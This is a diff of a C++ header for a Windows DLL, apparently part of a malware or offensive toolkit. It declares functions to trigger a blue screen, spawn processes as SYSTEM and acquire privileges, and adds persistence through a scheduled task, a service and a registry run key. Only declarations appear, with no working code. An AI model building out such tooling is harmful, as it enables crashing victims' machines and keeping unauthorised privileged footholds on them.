@@ -11,6 +11,14 @@
 #include <fstream>
 #include <io.h>
 #include<stdbool.h>
-extern "C" __declspec(dllexport)BOOL CreateInSystem(LPWSTR processName);
+#include <taskschd.h>
+#include <comdef.h> 
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsuppw.lib")
 extern "C" __declspec(dllexport)void BlueScreen();
+extern "C" __declspec(dllexport)BOOL CreateInSystem(LPWSTR processName);
 extern "C" __declspec(dllexport)BOOL GetPrivileges();
+BOOL ITaskToStartup(const std::wstring& appPath);
+BOOL ServiceAddStartup(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR binaryPath);
+BOOL RootKeyAddStartup(LPCTSTR lpApplicationName, LPCTSTR lpKeyName);
+int GetProcessPermission();
